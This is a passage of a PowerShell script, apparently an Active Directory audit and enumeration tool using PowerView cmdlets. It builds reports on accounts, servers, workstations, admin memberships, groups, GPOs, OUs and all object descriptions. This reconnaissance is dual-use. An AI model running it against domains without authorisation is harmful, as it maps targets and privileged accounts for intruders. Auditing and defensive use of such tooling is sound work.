				'Nb Enabled' = ($UserAccountAnalysis | Where-Object { $_.useraccountcontrol -notmatch "ACCOUNTDISABLE" }).Name.Count
				'Nb Disabled' = ($UserAccountAnalysis | Where-Object { $_.useraccountcontrol -band 2 }).Name.Count
				'Nb Active' = ($UserAccountAnalysis | Where-Object { $_.lastlogontimestamp -ge $inactiveThreshold}).Name.count
				'Nb Inactive' = ($UserAccountAnalysis | Where-Object { $_.lastlogontimestamp -lt $inactiveThreshold}).Name.count
				'Nb Locked' = ($UserAccountAnalysis | Where-Object { $_.lockouttime -ne $null }).Name.Count
				'Nb Pwd Never Expire' = ($UserAccountAnalysis | Where-Object { $_.useraccountcontrol -match "DONT_EXPIRE_PASSWORD" }).Name.Count
				'Nb Password not Req.' = ($UserAccountAnalysis | Where-Object { $_.useraccountcontrol -match "PASSWD_NOTREQD" }).Name.Count
				'Nb Reversible Password' = ($UserAccountAnalysis | Where-Object { $_.useraccountcontrol -band 128 }).Name.count
			}
			
		}
	}

 	if ($TempUserAccountAnalysis) {
		$TempUserAccountAnalysis | Sort-Object Domain | Format-Table -AutoSize
		$HTMLUserAccountAnalysis = $TempUserAccountAnalysis | Sort-Object Domain | ConvertTo-Html -Fragment -PreContent "<h2>User Accounts Analysis</h2>"

  		$UserAccountAnalysisTable = [PSCustomObject]@{
			"Recommendations" = "Review Inactive and Disabled User Accounts and consider deleting them from AD"
		}
		
		$HTMLUserAccountAnalysisTable = $UserAccountAnalysisTable | ConvertTo-Html -As List -Fragment
  		$HTMLUserAccountAnalysisTable = $HTMLUserAccountAnalysisTable.Replace("*", "Recommendations")
	}
	
	######################################################
    ########### Computer Accounts Analysis ###############
	######################################################
	
	Write-Host ""
	Write-Host "Computer Account Analysis:" -ForegroundColor Cyan

	if ($Domain -and $Server) {
		
		$ComputerAccountAnalysis = Get-DomainComputer -Domain $Domain -Server $Server
		
		$TempComputerAccountAnalysis = [PSCustomObject]@{
  			Domain = $Domain
			'Nb Computer Accounts' = $ComputerAccountAnalysis.Name.count
			'Nb Enabled' = ($ComputerAccountAnalysis | Where-Object { $_.useraccountcontrol -notmatch "ACCOUNTDISABLE" }).Name.Count
			'Nb Disabled' = $ComputerAccountAnalysis.Name.count - ($ComputerAccountAnalysis | Where-Object { $_.useraccountcontrol -notmatch "ACCOUNTDISABLE" }).Name.Count
			'Nb Active' = ($ComputerAccountAnalysis | Where-Object { $_.lastlogontimestamp -ge $inactiveThreshold}).Name.count
			'Nb Inactive' = ($ComputerAccountAnalysis | Where-Object { $_.lastlogontimestamp -lt $inactiveThreshold}).Name.count
			'Unconstrained Delegations' = ($TempUnconstrained | Where-Object {$_.Domain -eq $Domain}).Name.Count
		}
	}
	
	else{
		
		$TempComputerAccountAnalysis = foreach ($AllDomain in $AllDomains) {
			$ComputerAccountAnalysis = Get-DomainComputer -Domain $AllDomain
			
			[PSCustomObject]@{
   				Domain = $AllDomain
				'Nb Computer Accounts' = $ComputerAccountAnalysis.Name.count
				'Nb Enabled' = ($ComputerAccountAnalysis | Where-Object { $_.useraccountcontrol -notmatch "ACCOUNTDISABLE" }).Name.Count
				'Nb Disabled' = $ComputerAccountAnalysis.Name.count - ($ComputerAccountAnalysis | Where-Object { $_.useraccountcontrol -notmatch "ACCOUNTDISABLE" }).Name.Count
				'Nb Active' = ($ComputerAccountAnalysis | Where-Object { $_.lastlogontimestamp -ge $inactiveThreshold}).Name.count
				'Nb Inactive' = ($ComputerAccountAnalysis | Where-Object { $_.lastlogontimestamp -lt $inactiveThreshold}).Name.count
				'Unconstrained Delegations' = ($TempUnconstrained | Where-Object {$_.Domain -eq $AllDomain}).Name.Count
			}
			
		}
	}

 	if ($TempComputerAccountAnalysis) {
		$TempComputerAccountAnalysis | Sort-Object Domain | Format-Table -AutoSize
		$HTMLComputerAccountAnalysis = $TempComputerAccountAnalysis | Sort-Object Domain | ConvertTo-Html -Fragment -PreContent "<h2>Computer Account Analysis</h2>"

  		$ComputerAccountAnalysisTable = [PSCustomObject]@{
			"Recommendations" = "Review Inactive and Disabled Computer Accounts and consider deleting them from AD"
		}
		
		$HTMLComputerAccountAnalysisTable = $ComputerAccountAnalysisTable | ConvertTo-Html -As List -Fragment
  		$HTMLComputerAccountAnalysisTable = $HTMLComputerAccountAnalysisTable.Replace("*", "Recommendations")
	}
	
	######################################################
    ########### Operating Systems Analysis ###############
	######################################################
	
	Write-Host ""
	Write-Host "Operating Systems Analysis:" -ForegroundColor Cyan

	if ($Domain -and $Server) {
		
		$AllSystems = Get-DomainComputer -Domain $Domain -Server $Server
		$OperatingSystemsAnalysis = $AllSystems | Select-Object -ExpandProperty operatingsystem | Sort-Object -Unique
		
		$TempOperatingSystemsAnalysis = foreach($OperatingSystem in $OperatingSystemsAnalysis){
		
			[PSCustomObject]@{
				Domain = $Domain
    				'Operating System' = $OperatingSystem
				'Nb OS' = ($AllSystems | Where-Object {$_.operatingsystem -eq $OperatingSystem}).Name.count
				'Nb Enabled' = ($AllSystems | Where-Object {$_.operatingsystem -eq $OperatingSystem} | Where-Object { $_.useraccountcontrol -notmatch "ACCOUNTDISABLE" }).Name.Count
				'Nb Disabled' = ($AllSystems | Where-Object {$_.operatingsystem -eq $OperatingSystem}).Name.count - ($AllSystems | Where-Object {$_.operatingsystem -eq $OperatingSystem} | Where-Object { $_.useraccountcontrol -notmatch "ACCOUNTDISABLE" }).Name.Count
				'Nb Active' = ($AllSystems | Where-Object {$_.operatingsystem -eq $OperatingSystem} | Where-Object { $_.lastlogontimestamp -ge $inactiveThreshold}).Name.count
				'Nb Inactive' = ($AllSystems | Where-Object {$_.operatingsystem -eq $OperatingSystem} | Where-Object { $_.lastlogontimestamp -lt $inactiveThreshold}).Name.count
			}
			
		}
	}
	
	else{
		
		$TempOperatingSystemsAnalysis = foreach ($AllDomain in $AllDomains) {
			$AllSystems = Get-DomainComputer -Domain $AllDomain
			$OperatingSystemsAnalysis = $AllSystems | Select-Object -ExpandProperty operatingsystem | Sort-Object -Unique
			
			foreach($OperatingSystem in $OperatingSystemsAnalysis){
				[PSCustomObject]@{
    					Domain = $AllDomain
					'Operating System' = $OperatingSystem
					'Nb OS' = ($AllSystems | Where-Object {$_.operatingsystem -eq $OperatingSystem}).Name.count
					'Nb Enabled' = ($AllSystems | Where-Object {$_.operatingsystem -eq $OperatingSystem} | Where-Object { $_.useraccountcontrol -notmatch "ACCOUNTDISABLE" }).Name.Count
					'Nb Disabled' = ($AllSystems | Where-Object {$_.operatingsystem -eq $OperatingSystem}).Name.count - ($AllSystems | Where-Object {$_.operatingsystem -eq $OperatingSystem} | Where-Object { $_.useraccountcontrol -notmatch "ACCOUNTDISABLE" }).Name.Count
					'Nb Active' = ($AllSystems | Where-Object {$_.operatingsystem -eq $OperatingSystem} | Where-Object { $_.lastlogontimestamp -ge $inactiveThreshold}).Name.count
					'Nb Inactive' = ($AllSystems | Where-Object {$_.operatingsystem -eq $OperatingSystem} | Where-Object { $_.lastlogontimestamp -lt $inactiveThreshold}).Name.count
				}
			}
			
		}
	}

 	if ($TempOperatingSystemsAnalysis) {
		$TempOperatingSystemsAnalysis | Sort-Object Domain,'Operating System' | Format-Table -AutoSize
		$HTMLOperatingSystemsAnalysis = $TempOperatingSystemsAnalysis | Sort-Object Domain,'Operating System' | ConvertTo-Html -Fragment -PreContent "<h2>Operating Systems Analysis</h2>"
	}
	
	############################################
    ########### Servers (Enabled)###############
	############################################
	
    if($NoServers){}
    else{
        Write-Host ""
		Write-Host "Servers (Enabled):" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$ComputerServers = Get-DomainComputer -Domain $Domain -Server $Server -OperatingSystem "*Server*" -UACFilter NOT_ACCOUNTDISABLE
			$TempServersEnabled = foreach ($ComputerServer in $ComputerServers) {
				[PSCustomObject]@{
					"Name" = $ComputerServer.samaccountname
					"Enabled" = if ($ComputerServer.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ($ComputerServer.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
					"IP Address" = (Resolve-DnsName -Name $ComputerServer.DnsHostName -Type A).IPAddress
					"Account SID" = $ComputerServer.objectsid
					"Operating System" = $ComputerServer.operatingsystem
					"Domain" = $Domain
					#Description = $ComputerServer.description
				}
			}
		}
		else {
			$TempServersEnabled = foreach ($AllDomain in $AllDomains) {
				$ComputerServers = Get-DomainComputer -Domain $AllDomain -OperatingSystem "*Server*" -UACFilter NOT_ACCOUNTDISABLE
				foreach ($ComputerServer in $ComputerServers) {
					[PSCustomObject]@{
						"Name" = $ComputerServer.samaccountname
						"Enabled" = if ($ComputerServer.useraccountcontrol -band 2) { "False" } else { "True" }
						"Active" = if ($ComputerServer.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
						"IP Address" = (Resolve-DnsName -Name $ComputerServer.DnsHostName -Type A).IPAddress
						"Account SID" = $ComputerServer.objectsid
						"Operating System" = $ComputerServer.operatingsystem
						"Domain" = $AllDomain
						#Description = $ComputerServer.description
					}
				}
			}
		}

  		if ($TempServersEnabled) {
			$TempServersEnabled | Sort-Object Domain,Name | Format-Table -AutoSize -Wrap
			$HTMLServersEnabled = $TempServersEnabled | Sort-Object Domain,Name | ConvertTo-Html -Fragment -PreContent "<h2>Servers (Enabled)</h2>"
		}
    }
	
	#############################################
    ########### Servers (Disabled)###############
	#############################################
	
    if($NoServers){}
    else{
        Write-Host ""
		Write-Host "Servers (Disabled):" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$ComputerServers = Get-DomainComputer -Domain $Domain -Server $Server -OperatingSystem "*Server*" -UACFilter ACCOUNTDISABLE
			$TempServersDisabled = foreach ($ComputerServer in $ComputerServers) {
				[PSCustomObject]@{
					"Name" = $ComputerServer.samaccountname
					"Enabled" = if ($ComputerServer.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ($ComputerServer.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
					"IP Address" = (Resolve-DnsName -Name $ComputerServer.DnsHostName -Type A).IPAddress
					"Account SID" = $ComputerServer.objectsid
					"Operating System" = $ComputerServer.operatingsystem
					"Domain" = $Domain
					#Description = $ComputerServer.description
				}
			}
		}
		else {
			$TempServersDisabled = foreach ($AllDomain in $AllDomains) {
				$ComputerServers = Get-DomainComputer -Domain $AllDomain -OperatingSystem "*Server*" -UACFilter ACCOUNTDISABLE
				foreach ($ComputerServer in $ComputerServers) {
					[PSCustomObject]@{
						"Name" = $ComputerServer.samaccountname
						"Enabled" = if ($ComputerServer.useraccountcontrol -band 2) { "False" } else { "True" }
						"Active" = if ($ComputerServer.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
						"IP Address" = (Resolve-DnsName -Name $ComputerServer.DnsHostName -Type A).IPAddress
						"Account SID" = $ComputerServer.objectsid
						"Operating System" = $ComputerServer.operatingsystem
						"Domain" = $AllDomain
						#Description = $ComputerServer.description
					}
				}
			}
		}

    		if ($TempServersDisabled) {
			$TempServersDisabled | Sort-Object Domain,Name | Format-Table -AutoSize -Wrap
			$HTMLServersDisabled = $TempServersDisabled | Sort-Object Domain,Name | ConvertTo-Html -Fragment -PreContent "<h2>Servers (Disabled)</h2>"
		}
    }
	
	##################################################
    ########### Workstations (Enabled) ###############
	##################################################
	
	if($Workstations -OR $AllEnum){
        	Write-Host ""
		Write-Host "Workstations (Enabled):" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$AllWorkstations = Get-DomainComputer -Domain $Domain -Server $Server -UACFilter NOT_ACCOUNTDISABLE | Where-Object { $_.OperatingSystem -notlike "*Server*" }
			$TempWorkstationsEnabled = foreach ($Workstation in $AllWorkstations) {
				[PSCustomObject]@{
					"Name" = $Workstation.samaccountname
					"Enabled" = if ($Workstation.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ($Workstation.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
					"IP Address" = (Resolve-DnsName -Name $Workstation.DnsHostName -Type A).IPAddress
					"Account SID" = $Workstation.objectsid
					"Operating System" = $Workstation.operatingsystem
					"Domain" = $Domain
					#Description = $Workstation.description
				}
			}
		}
		else {
			$TempWorkstationsEnabled = foreach ($AllDomain in $AllDomains) {
				$AllWorkstations = Get-DomainComputer -Domain $AllDomain -UACFilter NOT_ACCOUNTDISABLE | Where-Object { $_.OperatingSystem -notlike "*Server*" }
				foreach ($Workstation in $AllWorkstations) {
					[PSCustomObject]@{
						"Name" = $Workstation.samaccountname
						"Enabled" = if ($Workstation.useraccountcontrol -band 2) { "False" } else { "True" }
						"Active" = if ($Workstation.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
						"IP Address" = (Resolve-DnsName -Name $Workstation.DnsHostName -Type A).IPAddress
						"Account SID" = $Workstation.objectsid
						"Operating System" = $Workstation.operatingsystem
						"Domain" = $AllDomain
						#Description = $Workstation.description
					}
				}
			}
		}

  		if ($TempWorkstationsEnabled) {
			$TempWorkstationsEnabled | Sort-Object Domain,Name | Format-Table -AutoSize -Wrap
			$HTMLWorkstationsEnabled = $TempWorkstationsEnabled | Sort-Object Domain,Name | ConvertTo-Html -Fragment -PreContent "<h2>Workstations (Enabled)</h2>"
		}

	}
	
	###################################################
    ########### Workstations (Disabled) ###############
	###################################################
	
	if($Workstations -OR $AllEnum){
        Write-Host ""
		Write-Host "Workstations (Disabled):" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$AllWorkstations = Get-DomainComputer -Domain $Domain -Server $Server -UACFilter ACCOUNTDISABLE | Where-Object { $_.OperatingSystem -notlike "*Server*" }
			$TempWorkstationsDisabled = foreach ($Workstation in $AllWorkstations) {
				[PSCustomObject]@{
					"Name" = $Workstation.samaccountname
					"Enabled" = if ($Workstation.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ($Workstation.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
					"IP Address" = (Resolve-DnsName -Name $Workstation.DnsHostName -Type A).IPAddress
					"Account SID" = $Workstation.objectsid
					"Operating System" = $Workstation.operatingsystem
					"Domain" = $Domain
					#Description = $Workstation.description
				}
			}
		}
		else {
			$TempWorkstationsDisabled = foreach ($AllDomain in $AllDomains) {
				$AllWorkstations = Get-DomainComputer -Domain $AllDomain -UACFilter ACCOUNTDISABLE | Where-Object { $_.OperatingSystem -notlike "*Server*" }
				foreach ($Workstation in $AllWorkstations) {
					[PSCustomObject]@{
						"Name" = $Workstation.samaccountname
						"Enabled" = if ($Workstation.useraccountcontrol -band 2) { "False" } else { "True" }
						"Active" = if ($Workstation.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
						"IP Address" = (Resolve-DnsName -Name $Workstation.DnsHostName -Type A).IPAddress
						"Account SID" = $Workstation.objectsid
						"Operating System" = $Workstation.operatingsystem
						"Domain" = $AllDomain
						#Description = $Workstation.description
					}
				}
			}
		}

    		if ($TempWorkstationsDisabled) {
			$TempWorkstationsDisabled | Sort-Object Domain,Name | Format-Table -AutoSize -Wrap
			$HTMLWorkstationsDisabled = $TempWorkstationsDisabled | Sort-Object Domain,Name | ConvertTo-Html -Fragment -PreContent "<h2>Workstations (Disabled)</h2>"
		}
    }

	#####################################
    ########### Enabled Users ###########
	#####################################
	
	if ($DomainUsers -OR $AllEnum){
		Write-Host ""
		Write-Host "Users (Enabled):" -ForegroundColor Cyan
		
		if ($Domain -and $Server) {
			$EnabledUsers = Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Domain $Domain -Server $Server
			$TempEnabledUsers = foreach ($EnabledUser in $EnabledUsers) {
				[PSCustomObject]@{
					"User Name" = $EnabledUser.samaccountname
     					"Enabled" = if ($EnabledUser.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ($EnabledUser.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
     					"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $EnabledUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $EnabledUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $EnabledUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"Object SID" = $EnabledUser.objectsid
					"Domain" = $Domain
					"Groups" = (Get-DomainGroup -Domain $Domain -Server $Server -UserName $EnabledUser.samaccountname).Name -join ' - '
					#"Description" = $EnabledUser.description
				}
			}
		}
		else {
			$TempEnabledUsers = foreach ($AllDomain in $AllDomains) {
				$EnabledUsers = Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Domain $AllDomain
				foreach ($EnabledUser in $EnabledUsers) {
					[PSCustomObject]@{
						"User Name" = $EnabledUser.samaccountname
      						"Enabled" = if ($EnabledUser.useraccountcontrol -band 2) { "False" } else { "True" }
						"Active" = if ($EnabledUser.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
     						"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $EnabledUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
						"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $EnabledUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
						"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $EnabledUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
						"Object SID" = $EnabledUser.objectsid
						"Domain" = $AllDomain
						"Groups" = (Get-DomainGroup -Domain $AllDomain -UserName $EnabledUser.samaccountname).Name -join ' - '
						#"Description" = $EnabledUser.description
					}
				}
			}
		}

  		if ($TempEnabledUsers) {
			$TempEnabledUsers | Sort-Object Domain,"User Name" | Format-Table -AutoSize -Wrap
			$HTMLEnabledUsers = $TempEnabledUsers | Sort-Object Domain,"User Name" | ConvertTo-Html -Fragment -PreContent "<h2>Users (Enabled)</h2>"
		}
	}

	
	######################################
    ########### Disabled Users ###########
	######################################
	
	if ($DomainUsers -OR $AllEnum){
		Write-Host ""
		Write-Host "Users (Disabled):" -ForegroundColor Cyan
		
		if ($Domain -and $Server) {
			$DisabledUsers = Get-DomainUser -UACFilter ACCOUNTDISABLE -Domain $Domain -Server $Server
			$TempDisabledUsers = foreach ($DisabledUser in $DisabledUsers) {
				[PSCustomObject]@{
					"User Name" = $DisabledUser.samaccountname
     					"Enabled" = if ($DisabledUser.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ($DisabledUser.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
     					"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $DisabledUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $DisabledUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $DisabledUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"Object SID" = $DisabledUser.objectsid
					"Domain" = $Domain
					"Groups" = (Get-DomainGroup -Domain $Domain -Server $Server -UserName $DisabledUser.samaccountname).Name -join ' - '
					#"Description" = $DisabledUser.description
				}
			}
		}
		else {
			$TempDisabledUsers = foreach ($AllDomain in $AllDomains) {
				$DisabledUsers = Get-DomainUser -UACFilter ACCOUNTDISABLE -Domain $AllDomain
				foreach ($DisabledUser in $DisabledUsers) {
					[PSCustomObject]@{
						"User Name" = $DisabledUser.samaccountname
      						"Enabled" = if ($DisabledUser.useraccountcontrol -band 2) { "False" } else { "True" }
						"Active" = if ($DisabledUser.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
     						"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $DisabledUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
						"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $DisabledUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
						"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $DisabledUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
						"Object SID" = $DisabledUser.objectsid
						"Domain" = $AllDomain
						"Groups" = (Get-DomainGroup -Domain $AllDomain -UserName $DisabledUser.samaccountname).Name -join ' - '
						#"Description" = $DisabledUser.description
					}
				}
			}
		}

  		if ($TempDisabledUsers) {
			$TempDisabledUsers | Where-Object {$_."User Name" -ne "krbtgt"} | Sort-Object Domain,"User Name" | Format-Table -AutoSize -Wrap
			$HTMLDisabledUsers = $TempDisabledUsers | Where-Object {$_."User Name" -ne "krbtgt"} | Sort-Object Domain,"User Name" | ConvertTo-Html -Fragment -PreContent "<h2>Users (Disabled)</h2>"
		}
	}

 	##################################
    ########### All Groups ###########
	##################################
	
	if($AllGroups -OR $AllEnum){
		Write-Host ""
		Write-Host "All Groups:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$OtherGroups = Get-DomainGroup -Domain $Domain -Server $Server
			$TempOtherGroups = foreach ($OtherGroup in $OtherGroups) {
				
				$OtherGroupMembers = $null
				$OtherGroupMembername = $null
				$OtherGroupMembernames = $null
				$OtherGroupMembernames = @()
				
				$OtherGroupMembers = Get-DomainGroupMember -Domain $Domain -Identity $OtherGroup.samaccountname -Recurse
				
				foreach($OtherGroupMember in $OtherGroupMembers){
						
					$convertedMemberName = $null
					#$PlaceHolderDomain = $null
					if($OtherGroupMember.MemberName){}
					else{
						foreach ($PlaceHolderDomain in $PlaceHolderDomains) {
							
							try {
								$convertedMemberName = ConvertFrom-SID $OtherGroupMember.MemberSID -Domain $PlaceHolderDomain
								if ($null -ne $convertedMemberName) { break }
							}
							catch {
								continue
							}
							
						}

      						if($convertedMemberName){}
			      			else {
			     				$ForeignGroupMemberAccount = $null
			     				$ForeignGroupMemberAccount = New-Object System.Security.Principal.SecurityIdentifier $OtherGroupMember.MemberSID
			    				$convertedMemberName = $ForeignGroupMemberAccount.Translate([System.Security.Principal.NTAccount]).Value
			     			}
					}
					
					$OtherGroupMembername = if ($OtherGroupMember.MemberName) { $OtherGroupMember.MemberName } elseif ($convertedMemberName) { $convertedMemberName } else {$OtherGroupMember.MemberSID}
					
					$OtherGroupMembernames += $OtherGroupMembername
				
				}
				
				[PSCustomObject]@{
					"Group Name" = $OtherGroup.SamAccountName
					"Group SID" = $OtherGroup.objectsid
					"Domain" = $AllDomain
					"Members" = ($OtherGroupmembernames | Sort-Object -Unique) -join ' - '
					#Description = $OtherGroup.description
				}
				
			}
		}
		else {
			$TempOtherGroups = foreach ($AllDomain in $AllDomains) {
				$OtherGroups = Get-DomainGroup -Domain $AllDomain
				foreach ($OtherGroup in $OtherGroups) {
					
					$OtherGroupMembers = $null
					$OtherGroupMembername = $null
					$OtherGroupMembernames = $null
					$OtherGroupMembernames = @()
					
					$OtherGroupMembers = Get-DomainGroupMember -Domain $AllDomain -Identity $OtherGroup.samaccountname -Recurse
					
					foreach($OtherGroupMember in $OtherGroupMembers){
						
						$convertedMemberName = $null
						#$PlaceHolderDomain = $null
						if($OtherGroupMember.MemberName){}
						else{
							foreach ($PlaceHolderDomain in $PlaceHolderDomains) {
								
								try {
									$convertedMemberName = ConvertFrom-SID $OtherGroupMember.MemberSID -Domain $PlaceHolderDomain
									if ($null -ne $convertedMemberName) { break }
								}
								catch {
									continue
								}
								
							}

       							if($convertedMemberName){}
				      			else {
				     				$ForeignGroupMemberAccount = $null
				     				$ForeignGroupMemberAccount = New-Object System.Security.Principal.SecurityIdentifier $OtherGroupMember.MemberSID
				    				$convertedMemberName = $ForeignGroupMemberAccount.Translate([System.Security.Principal.NTAccount]).Value
				     			}
						}
						
						$OtherGroupMembername = if ($OtherGroupMember.MemberName) { $OtherGroupMember.MemberName } elseif ($convertedMemberName) { $convertedMemberName } else {$OtherGroupMember.MemberSID}
						
						$OtherGroupMembernames += $OtherGroupMembername
					
					}
					
					[PSCustomObject]@{
						"Group Name" = $OtherGroup.SamAccountName
						"Group SID" = $OtherGroup.objectsid
						"Domain" = $AllDomain
						"Members" = ($OtherGroupmembernames | Sort-Object -Unique) -join ' - '
						#Description = $OtherGroup.description
					}
				}
			}
		}

  		if ($TempOtherGroups) {
			$TempOtherGroups | Sort-Object Domain,"Group Name" | Format-Table -AutoSize -Wrap
			$HTMLOtherGroups = $TempOtherGroups | Sort-Object Domain,"Group Name" | ConvertTo-Html -Fragment -PreContent "<h2>All Groups</h2>"
		}
	}

 	###########################################
    ########### All Domain GPOs ###############
	###########################################
	
	if($AllGPOs -OR $AllEnum){
        Write-Host ""
		Write-Host "All Domain GPOs:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$DomainGPOs = Get-DomainGPO -Domain $Domain -Server $Server -Properties DisplayName, gpcfilesyspath
			$TempDomainGPOs = foreach ($DomainGPO in $DomainGPOs) {
   				$GPOGuid = ($DomainGPO.gpcfilesyspath -split "}")[-2].split("{")[-1]  # Extracting the GPO's GUID
       				$OUs = (Get-DomainOU -GPLink "*$GPOGuid*").name -Join " - "
				[PSCustomObject]@{
					"GPO Name" = $DomainGPO.DisplayName
					"Path" = $DomainGPO.gpcfilesyspath
     					"OUs the policy applies to" = $OUs
					Domain = $Domain
				}
			}
		}
		else {
			$TempDomainGPOs = foreach ($AllDomain in $AllDomains) {
				$DomainGPOs = Get-DomainGPO -Domain $AllDomain -Properties DisplayName, gpcfilesyspath
				foreach ($DomainGPO in $DomainGPOs) {
    					$GPOGuid = ($DomainGPO.gpcfilesyspath -split "}")[-2].split("{")[-1]  # Extracting the GPO's GUID
	 				$OUs = (Get-DomainOU -GPLink "*$GPOGuid*").name -Join " - "
					[PSCustomObject]@{
						"GPO Name" = $DomainGPO.DisplayName
						"Path" = $DomainGPO.gpcfilesyspath
      						"OUs the policy applies to" = $OUs
						Domain = $AllDomain
					}
				}
			}
		}

  		if ($TempDomainGPOs) {
			$TempDomainGPOs | Sort-Object Domain,"GPO Name" | Format-Table -AutoSize -Wrap
			$HTMLDomainGPOs = $TempDomainGPOs | Sort-Object Domain,"GPO Name" | ConvertTo-Html -Fragment -PreContent "<h2>All Domain GPOs</h2>"
		}
	}
	
	######################################
    ########### Domain OUs ###########
	######################################
	
	if($DomainOUs -OR $AllEnum){
		Write-Host ""
		Write-Host "All Domain OUs:" -ForegroundColor Cyan

		if($Domain -AND $Server) {
			$TempAllDomainOUs = Get-DomainOU -Domain $Domain -Server $Server | ForEach-Object {
				$ou = $_
				$users = (Get-DomainUser -Domain $Domain -Server $Server -SearchBase "LDAP://$($_.DistinguishedName)").samaccountname
				$computers = Get-DomainComputer -Domain $Domain -Server $Server -SearchBase "LDAP://$($_.DistinguishedName)"

				$members = @()
				if ($users) { $members += $users }
				if ($computers) { $members += $computers.Name }

				[PSCustomObject]@{
					Name = $ou.Name
					Domain = $Domain
					Members = $members -join ' - '
				}
			}
		}
		else{
			$TempAllDomainOUs = foreach($AllDomain in $AllDomains){
				Get-DomainOU -Domain $AllDomain | ForEach-Object {
					$ou = $_
					$users = (Get-DomainUser -Domain $AllDomain -SearchBase "LDAP://$($_.DistinguishedName)").samaccountname
					$computers = Get-DomainComputer -Domain $AllDomain -SearchBase "LDAP://$($_.DistinguishedName)"

					$members = @()
					if ($users) { $members += $users }
					if ($computers) { $members += $computers.Name }

					[PSCustomObject]@{
						Name = $ou.Name
						Domain = $AllDomain
						Members = $members -join ' - '
					}
				}
			}
		}

  		if($TempAllDomainOUs) {
			$TempAllDomainOUs | Sort-Object Domain,Name | Format-Table -AutoSize -Wrap
			$HTMLAllDomainOUs = $TempAllDomainOUs | Sort-Object Domain,Name | ConvertTo-Html -Fragment -PreContent "<h2>All Domain OUs</h2>"
		}
	}

 	####################################################
	########### All Descriptions ################
	####################################################

 	if($AllDescriptions -OR $AllEnum){
		Write-Host ""
		Write-Host "All Descriptions:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$Descriptions = Get-DomainObject -Properties description,name -Domain $Domain -Server $Server | Where-Object {$_.description -ne $null}
			$TempAllDescriptions = foreach($Description in $Descriptions){
	
				[PSCustomObject]@{
					"Domain Object" = $Description.name
					"Domain" = $Domain
					"Description" = $Description.description
				}
			}
		}
		else {
			$TempAllDescriptions = foreach ($AllDomain in $AllDomains) {
				$Descriptions = Get-DomainObject -Properties description,name -Domain $AllDomain | Where-Object {$_.description -ne $null}
				foreach($Description in $Descriptions){
	
					[PSCustomObject]@{
						"Domain Object" = $Description.name
						"Domain" = $AllDomain
						"Description" = $Description.description
					}
				}
			}
		}
	
		if ($TempAllDescriptions) {
			$TempAllDescriptions | Sort-Object Domain,"Domain Object" | Format-Table -Autosize -Wrap
			$HTMLAllDescriptions = $TempAllDescriptions | Sort-Object Domain,"Domain Object" | ConvertTo-Html -Fragment -PreContent "<h2>All Descriptions</h2>"
		}
  	}

	#############################################
    ########### Output and Report ###############
	#############################################
    
    # Stop capturing the output and display it on the console
    Stop-Transcript | Out-Null
	
